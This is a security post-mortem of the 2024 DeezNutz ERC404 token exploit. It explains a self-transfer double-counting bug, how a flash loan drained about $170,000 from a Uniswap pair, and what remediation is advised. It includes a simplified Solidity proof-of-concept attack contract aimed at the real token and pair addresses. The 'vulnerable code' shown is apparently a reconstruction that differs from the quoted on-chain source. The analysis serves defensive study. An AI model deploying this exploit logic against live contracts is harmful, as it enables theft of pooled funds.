# DeezNutz404 — Flash Loan-Based Self-Transfer Price Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2024-02-20 |
| **Protocol** | DeezNutz (ERC404 Token) |
| **Chain** | Ethereum |
| **Loss** | ~$170,000 |
| **Attacker** | [0xd215ffaf](https://etherscan.io/address/0xd215ffaf0f85fb6f93f11e49bd6175ad58af0dfd) |
| **Attack Contract** | [0xd129d8c1](https://etherscan.io/address/0xd129d8c12f0e7aa51157d9e6cc3f7ece2dc84ecd) |
| **Vulnerable Contract** | [DeezNutz 0xb57e874](https://etherscan.io/address/0xb57e874082417b66877429481473cf9fcd8e0b8a) |
| **Root Cause** | Self-transfer in ERC404 token bypasses balance checks, double-counting tokens, manipulating LP pair balance to generate WETH swap profit |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/DeezNutz404_exp.sol) |

---

## 1. Vulnerability Overview

DeezNutz is a token using the ERC404 standard (ERC20+ERC721 hybrid), whose `transferFrom` implementation contains special handling for cases where sender == recipient. The attacker borrowed 2,000 WETH via a Balancer flash loan to purchase DeezNutz, then performed 5 self-transfers to double-count the internal balance, transferred it to the LP pair, and withdrew an excessive amount of WETH.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: ERC404 self-transfer handling flaw
function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
    // When from == to, balance is credited twice
    if (from == to) {
        // When sender and recipient are the same, recipient balance increases without decreasing sender balance
        _balanceOf[to] += amount;  // ← Vulnerability: no balance deduction
    } else {
        _balanceOf[from] -= amount;
        _balanceOf[to] += amount;
    }
    return true;
}

// ✅ Safe code: block self-transfer or treat as noOp
function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
    if (from == to) return true;  // self-transfer is noOp (or revert)
    _balanceOf[from] -= amount;
    _balanceOf[to] += amount;
    return true;
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: DeezNutz.sol
    function transfer(
        address to,
        uint256 amount
    ) public override returns (bool) {
        if (!tradingEnabled) {
            require(msg.sender == owner(), "Trading is not enabled");
        }
        _transfer(msg.sender, to, amount);  // ❌ Vulnerability
        return true;
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Balancer flash: 2,000 WETH flash loan
  │
  ├─→ [2] WETH → DeezNutz (Uniswap V2)
  │
  ├─→ [3] DeezNutz 5x self-transfer (self → self)
  │         └─ Balance doubles with each transfer
  │
  ├─→ [4] Transfer inflated DeezNutz to LP pair
  │
  ├─→ [5] Withdraw excess WETH from LP pair
  │
  ├─→ [6] Repay flash loan (2,001 WETH)
  │
  └─→ [7] ~$170K profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IDeezNutz {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract AttackContract {
    IDeezNutz  constant deez = IDeezNutz(0xb57e874082417b66877429481473cf9fcd8e0b8a);
    IUniswapV2 constant pair = IUniswapV2(0x1fB4904b26DE8C043959201A63b4b23C414251E2);

    function receiveFlashLoan(
        IERC20[] memory, uint256[] memory, uint256[] memory, bytes memory
    ) external {
        // [1] Swap WETH → DeezNutz
        swapWETHToDeezNutz(2000 ether);

        // [2] Double balance via 5 self-transfers
        uint256 balance = deez.balanceOf(address(this));
        for (uint i = 0; i < 5; i++) {
            deez.transferFrom(address(this), address(this), balance);
            balance = deez.balanceOf(address(this)); // doubles each iteration
        }

        // [3] Transfer inflated DeezNutz to LP pair
        deez.transferFrom(address(this), address(pair), balance / 2);

        // [4] Withdraw excess WETH from LP pair
        pair.swap(2001 ether, 0, address(this), "");

        // [5] Repay flash loan
        WETH.transfer(balancer, 2001 ether);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | ERC404 self-transfer double-counting vulnerability |
| **CWE** | CWE-682: Incorrect Calculation |
| **Attack Vector** | External (flash loan + self-transfer) |
| **DApp Category** | ERC404 hybrid token |
| **Impact** | Token balance manipulation to drain LP funds |

## 6. Remediation Recommendations

1. **Self-transfer noOp**: Immediately return true when `from == to` (no balance changes)
2. **ERC20 standard compliance**: Follow OpenZeppelin ERC20's `_transfer` pattern — revert or noOp when from == to
3. **ERC404 audit**: Conduct thorough security audits for edge cases when adopting new token standards
4. **Self-transfer testing**: Explicitly include `transfer(self, amount)` cases in unit tests

## 7. Lessons Learned

- New token standards like ERC404 introduce edge cases where assumptions from existing ERC20/ERC721 standards break down.
- `from == to` transfers generally appear harmless but can conceal critical bugs in balance calculation logic.
- LP pools using new token standards must scrutinize the token's transfer mechanics with particular care.